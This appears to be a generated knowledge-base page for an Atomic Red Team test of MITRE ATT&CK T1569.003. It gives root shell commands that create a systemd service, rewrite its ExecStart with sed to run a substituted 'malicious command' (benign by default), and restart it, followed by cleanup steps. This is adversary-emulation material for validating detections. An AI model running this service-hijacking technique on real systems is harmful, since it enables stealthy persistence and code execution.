---
atomic_guid: "6123928f-6389-4914-8d25-a5d69bd657fa"
title: "Modify Existing systemd Service to Execute Malicious Command"
framework: "atomic"
generated: "true"
attack_technique_id: "T1569.003"
attack_technique_name: "System Services: Systemctl"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.003/T1569.003.yaml"
build_date: "2026-04-26 14:38:40"
executor: "sh"
aliases:
  - "6123928f-6389-4914-8d25-a5d69bd657fa"
  - "Modify Existing systemd Service to Execute Malicious Command"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Modify Existing systemd Service to Execute Malicious Command

Creates a service unit file that initially runs a benign command, then modifies the
ExecStart directive using sed to substitute a malicious command before reloading and
restarting the service. Adversaries may hijack existing services to blend in with normal
service activity and avoid triggering detections focused solely on new service creation.

This technique reflects the tradecraft observed in more sophisticated intrusions where
blending into existing process trees is a priority over creating net-new services.

## Metadata

- Atomic GUID: 6123928f-6389-4914-8d25-a5d69bd657fa
- Technique: T1569.003: System Services: Systemctl
- Platforms: linux
- Executor: sh
- Elevation Required: True
- Dependency Executor: sh
- Source Path: atomics/T1569.003/T1569.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1569-system_services|T1569.003]]

## Input Arguments

### malicious_command

- description: Malicious command to substitute into ExecStart
- type: string
- default: /bin/bash -c "echo hijacked > /tmp/atomic_hijack_output.txt"

### service_name

- description: Name of the service to create and then modify for the test
- type: string
- default: atomic-modify-test

## Dependencies

systemctl must be available on the system

### Prerequisite Check

```text
if [ -x "$(command -v systemctl)" ]; then exit 0; else exit 1; fi
```

### Get Prerequisite

```text
echo "systemctl is not available. Ensure systemd is running on this system."
```

sed must be available on the system

### Prerequisite Check

```text
if [ -x "$(command -v sed)" ]; then exit 0; else exit 1; fi
```

### Get Prerequisite

```text
apt-get install -y sed 2>/dev/null || yum install -y sed 2>/dev/null || echo "Could not install sed automatically."
```

The test must be run as root or with sudo privileges

### Prerequisite Check

```text
if [ "$(id -u)" -eq 0 ]; then exit 0; else exit 1; fi
```

### Get Prerequisite

```text
echo "This test requires root privileges. Run as root or use sudo."
```

/etc/systemd/system/ directory must exist and be writable

### Prerequisite Check

```text
if [ -d "/etc/systemd/system" ] && [ -w "/etc/systemd/system" ]; then exit 0; else exit 1; fi
```

### Get Prerequisite

```text
echo "/etc/systemd/system/ does not exist or is not writable."
```

## Executor

- elevation_required: True
- name: sh

### Command

```sh
echo "[Unit]" > /etc/systemd/system/#{service_name}.service
echo "Description=Legitimate Looking Service" >> /etc/systemd/system/#{service_name}.service
echo "" >> /etc/systemd/system/#{service_name}.service
echo "[Service]" >> /etc/systemd/system/#{service_name}.service
echo "ExecStart=/bin/true" >> /etc/systemd/system/#{service_name}.service
echo "" >> /etc/systemd/system/#{service_name}.service
echo "[Install]" >> /etc/systemd/system/#{service_name}.service
echo "WantedBy=multi-user.target" >> /etc/systemd/system/#{service_name}.service
systemctl daemon-reload
sed -i 's|ExecStart=.*|ExecStart=#{malicious_command}|' /etc/systemd/system/#{service_name}.service
systemctl daemon-reload
systemctl start #{service_name}.service
systemctl status #{service_name}.service
```

### Cleanup

```sh
systemctl stop #{service_name}.service 2>/dev/null || true
systemctl disable #{service_name}.service 2>/dev/null || true
rm -f /etc/systemd/system/#{service_name}.service
systemctl daemon-reload
rm -f /tmp/atomic_hijack_output.txt
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.003/T1569.003.yaml)
